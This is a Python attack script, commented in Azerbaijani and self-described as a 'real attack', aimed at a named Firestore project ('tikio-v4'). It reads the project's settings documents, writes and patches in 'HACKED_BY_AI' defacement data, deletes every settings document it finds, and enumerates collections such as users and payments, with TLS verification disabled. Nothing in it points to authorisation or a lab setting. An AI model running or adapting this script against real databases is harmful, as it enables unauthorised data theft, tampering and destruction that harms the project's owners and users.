#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 FIRESTORE SETTINGS REAL HÜCUM SCRIPT
Bu script Firestore settings endpoint-inə real hücum edir
"""

import requests
import json
import time
from urllib.parse import urljoin
import urllib3

# SSL warnings disable et
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FirestoreAttacker:
    def __init__(self, project_id="tikio-v4"):
        self.project_id = project_id
        self.base_url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        
    def extract_settings_data(self):
        """Settings data-ı extract edir"""
        print("🔍 Settings data extract edilir...")
        
        settings_url = f"{self.base_url}/settings"
        
        try:
            response = self.session.get(settings_url, verify=False, timeout=10)
            print(f"   📊 Status Code: {response.status_code}")
            print(f"   📏 Content Length: {len(response.content)}")
            
            if response.status_code == 200:
                data = response.json()
                print("   ✅ Data uğurla extract edildi!")
                
                # Data strukturunu analiz et
                if 'documents' in data:
                    print(f"   📄 Tapılan documents: {len(data['documents'])}")
                    
                    for i, doc in enumerate(data['documents']):
                        print(f"\n   📋 Document {i+1}:")
                        print(f"      ID: {doc.get('name', 'Unknown').split('/')[-1]}")
                        print(f"      Create Time: {doc.get('createTime', 'Unknown')}")
                        print(f"      Update Time: {doc.get('updateTime', 'Unknown')}")
                        
                        # Fields məlumatları
                        if 'fields' in doc:
                            print(f"      Fields:")
                            for field_name, field_data in doc['fields'].items():
                                field_value = self.extract_field_value(field_data)
                                print(f"         • {field_name}: {field_value}")
                                
                return data
            else:
                print(f"   ❌ Data extract edilə bilmədi: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"   ❌ Xəta: {e}")
            return None
            
    def extract_field_value(self, field_data):
        """Field value-nu extract edir"""
        if 'stringValue' in field_data:
            return field_data['stringValue']
        elif 'integerValue' in field_data:
            return field_data['integerValue']
        elif 'booleanValue' in field_data:
            return field_data['booleanValue']
        elif 'doubleValue' in field_data:
            return field_data['doubleValue']
        elif 'timestampValue' in field_data:
            return field_data['timestampValue']
        elif 'arrayValue' in field_data:
            return f"Array[{len(field_data['arrayValue'].get('values', []))}]"
        elif 'mapValue' in field_data:
            return f"Map[{len(field_data['mapValue'].get('fields', {}))}]"
        else:
            return str(field_data)
            
    def test_data_modification(self):
        """Data modification test edir"""
        print("\n✏️ Data modification test edilir...")
        
        settings_url = f"{self.base_url}/settings"
        
        # Test data
        test_documents = [
            {
                "fields": {
                    "test_field": {"stringValue": "HACKED_BY_AI"},
                    "timestamp": {"timestampValue": "2024-08-28T12:00:00Z"},
                    "is_hacked": {"booleanValue": True}
                }
            },
            {
                "fields": {
                    "malicious_data": {"stringValue": "AI_ATTACK_SUCCESSFUL"},
                    "attack_time": {"timestampValue": "2024-08-28T12:00:00Z"},
                    "vulnerability_level": {"integerValue": 999}
                }
            }
        ]
        
        modification_results = []
        
        for i, test_doc in enumerate(test_documents):
            try:
                print(f"   🧪 Test document {i+1} göndərilir...")
                
                # POST request ilə yeni document yaratmağa çalış
                response = self.session.post(settings_url, json=test_doc, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"      ⚠️ VULNERABILITY: Document yaradıla bilər!")
                    modification_results.append(f"POST_SUCCESS:{i+1}")
                    
                    # Response data yoxla
                    try:
                        data = response.json()
                        if 'name' in data:
                            print(f"         📝 Created document: {data['name']}")
                    except:
                        pass
                        
                elif response.status_code == 403:
                    print(f"      ✅ Təhlükəsiz: POST qadağandır")
                else:
                    print(f"      ❓ Naməlum status: {response.status_code}")
                    
            except Exception as e:
                print(f"      ❌ Xəta: {e}")
                
        return modification_results
        
    def test_data_deletion(self):
        """Data deletion test edir"""
        print("\n🗑️ Data deletion test edilir...")
        
        # Əvvəlcə mövcud documents-ı al
        settings_data = self.extract_settings_data()
        
        if not settings_data or 'documents' not in settings_data:
            print("   ❌ Settings data tapılmadı")
            return []
            
        deletion_results = []
        
        for doc in settings_data['documents']:
            doc_id = doc.get('name', '').split('/')[-1]
            delete_url = f"{self.base_url}/settings/{doc_id}"
            
            try:
                print(f"   🗑️ Document silinməyə çalışılır: {doc_id}")
                
                # DELETE request
                response = self.session.delete(delete_url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"      ⚠️ VULNERABILITY: Document silinə bilər!")
                    deletion_results.append(f"DELETE_SUCCESS:{doc_id}")
                elif response.status_code == 403:
                    print(f"      ✅ Təhlükəsiz: DELETE qadağandır")
                else:
                    print(f"      ❓ Naməlum status: {response.status_code}")
                    
            except Exception as e:
                print(f"      ❌ Xəta: {e}")
                
        return deletion_results
        
    def test_data_update(self):
        """Data update test edir"""
        print("\n🔄 Data update test edilir...")
        
        # Əvvəlcə mövcud documents-ı al
        settings_data = self.extract_settings_data()
        
        if not settings_data or 'documents' not in settings_data:
            print("   ❌ Settings data tapılmadı")
            return []
            
        update_results = []
        
        for doc in settings_data['documents']:
            doc_id = doc.get('name', '').split('/')[-1]
            update_url = f"{self.base_url}/settings/{doc_id}"
            
            # Update data
            update_data = {
                "fields": {
                    "hacked_by_ai": {"stringValue": "AI_ATTACK_2024"},
                    "last_modified": {"timestampValue": "2024-08-28T12:00:00Z"},
                    "security_compromised": {"booleanValue": True}
                }
            }
            
            try:
                print(f"   🔄 Document update edilməyə çalışılır: {doc_id}")
                
                # PATCH request
                response = self.session.patch(update_url, json=update_data, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"      ⚠️ VULNERABILITY: Document update edilə bilər!")
                    update_results.append(f"UPDATE_SUCCESS:{doc_id}")
                elif response.status_code == 403:
                    print(f"      ✅ Təhlükəsiz: UPDATE qadağandır")
                else:
                    print(f"      ❓ Naməlum status: {response.status_code}")
                    
            except Exception as e:
                print(f"      ❌ Xəta: {e}")
                
        return update_results
        
    def test_collection_enumeration(self):
        """Collection enumeration test edir"""
        print("\n🔍 Collection enumeration test edilir...")
        
        # Common collection names
        common_collections = [
            "users", "posts", "settings", "config", "admin", "system",
            "backup", "logs", "analytics", "notifications", "payments",
            "subscriptions", "premium", "vip", "moderator", "support"
        ]
        
        found_collections = []
        
        for collection in common_collections:
            collection_url = f"{self.base_url}/{collection}"
            
            try:
                response = self.session.get(collection_url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ Collection tapıldı: {collection}")
                    found_collections.append(collection)
                    
                    # Data preview
                    try:
                        data = response.json()
                        if 'documents' in data:
                            print(f"      📊 Documents: {len(data['documents'])}")
                    except:
                        pass
                        
                elif response.status_code == 403:
                    print(f"   ❌ Collection qadağandır: {collection}")
                else:
                    print(f"   ❓ Naməlum status: {collection} - {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Xəta: {collection} - {e}")
                
        return found_collections
        
    def test_subcollection_access(self):
        """Subcollection access test edir"""
        print("\n📁 Subcollection access test edilir...")
        
        # Settings subcollections
        settings_subcollections = [
            "permissions", "roles", "access", "security", "config",
            "backup", "logs", "analytics", "notifications"
        ]
        
        accessible_subcollections = []
        
        for subcollection in settings_subcollections:
            subcollection_url = f"{self.base_url}/settings/{subcollection}"
            
            try:
                response = self.session.get(subcollection_url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: Subcollection əlçatandır: {subcollection}")
                    accessible_subcollections.append(subcollection)
                    
                    # Data preview
                    try:
                        data = response.json()
                        if 'documents' in data:
                            print(f"      📊 Documents: {len(data['documents'])}")
                    except:
                        pass
                        
                elif response.status_code == 403:
                    print(f"      ✅ Təhlükəsiz: {subcollection}")
                else:
                    print(f"      ❓ Naməlum: {subcollection} - {response.status_code}")
                    
            except Exception as e:
                print(f"      ❌ Xəta: {subcollection} - {e}")
                
        return accessible_subcollections
        
    def generate_attack_report(self, results):
        """Hücum hesabatı yaradır"""
        print("\n" + "="*80)
        print("🔥 FIRESTORE SETTINGS HÜCUM HESABATI")
        print("="*80)
        
        total_vulnerabilities = 0
        
        for category, vulns in results.items():
            if vulns:
                print(f"\n📂 {category.upper()}:")
                for vuln in vulns:
                    print(f"   ⚠️ {vuln}")
                    total_vulnerabilities += 1
            else:
                print(f"\n📂 {category.upper()}: ✅ Təhlükəsiz")
                
        print(f"\n🎯 ÜMUMİ VULNERABILITY-LƏR: {total_vulnerabilities}")
        
        if total_vulnerabilities > 0:
            print("\n🚨 KRİTİK TƏHLÜKƏSİZLİK XƏBƏRDARLIĞI:")
            print("   • Firestore settings endpoint-də kritik açıqlar var!")
            print("   • Data read/write/delete mümkündür!")
            print("   • Dərhal təhlükəsizlik tədbirləri görülməlidir!")
            
            print("\n💡 REAL HÜCUM İMKANLARI:")
            print("   • Bütün settings data-ı oxuna bilər")
            print("   • Yeni settings yaradıla bilər")
            print("   • Mövcud settings update edilə bilər")
            print("   • Settings silinə bilər")
            print("   • Digər collections əlçatandır")
        else:
            print("\n✅ TƏHLÜKƏSİZLİK STATUSU:")
            print("   • Firestore settings endpoint təhlükəsizdir")
            print("   • Bütün əməliyyatlar qorunur")
            
        return total_vulnerabilities
        
    def run_all_attacks(self):
        """Bütün hücumları işə salır"""
        print("🚀 FIRESTORE SETTINGS REAL HÜCUM BAŞLAYIR...")
        print("="*70)
        
        # Settings data extract
        settings_data = self.extract_settings_data()
        
        if not settings_data:
            print("❌ Settings data extract edilə bilmədi!")
            return
            
        # Bütün hücumları test et
        results = {
            "Data Modification": self.test_data_modification(),
            "Data Deletion": self.test_data_deletion(),
            "Data Update": self.test_data_update(),
            "Collection Enumeration": self.test_collection_enumeration(),
            "Subcollection Access": self.test_subcollection_access(),
        }
        
        # Hesabat yarat
        total_vulns = self.generate_attack_report(results)
        
        print(f"\n🎯 HÜCUM TAMAMLANDI! Tapılan vulnerability-lər: {total_vulns}")
        
        return results

if __name__ == "__main__":
    # Firestore project ID
    project_id = "tikio-v4"
    
    # Hücum başlat
    attacker = FirestoreAttacker(project_id)
    results = attacker.run_all_attacks()